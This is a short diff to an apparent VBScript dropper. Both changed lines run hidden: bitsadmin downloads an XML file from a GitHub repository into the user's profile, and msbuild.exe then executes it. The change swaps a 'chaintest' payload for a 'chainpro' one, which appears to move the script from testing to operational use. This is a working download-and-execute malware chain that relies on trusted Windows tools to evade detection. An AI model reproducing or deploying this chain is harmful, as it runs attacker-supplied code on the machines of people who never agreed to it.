@@ -28,7 +28,7 @@ WScript.Sleep 30000
 
 
 
-objShell.run("bitsadmin /transfer wcb /priority high https://raw.githubusercontent.com/shadowbrokerman/testing/master/chaintest.xml %USERPROFILE%\chaintest.xml"), 0, True
+objShell.run("bitsadmin /transfer wcb /priority high https://raw.githubusercontent.com/shadowbrokerman/testing/master/chainpro.xml %USERPROFILE%\chainpro.xml"), 0, True
 
 
 
@@ -36,7 +36,7 @@ WScript.Sleep 30000
 
 
 
-  objShell.run("%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %USERPROFILE%\chaintest.xml"), 0, False
+  objShell.run("%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe %USERPROFILE%\chainpro.xml"), 0, False
 
 
 
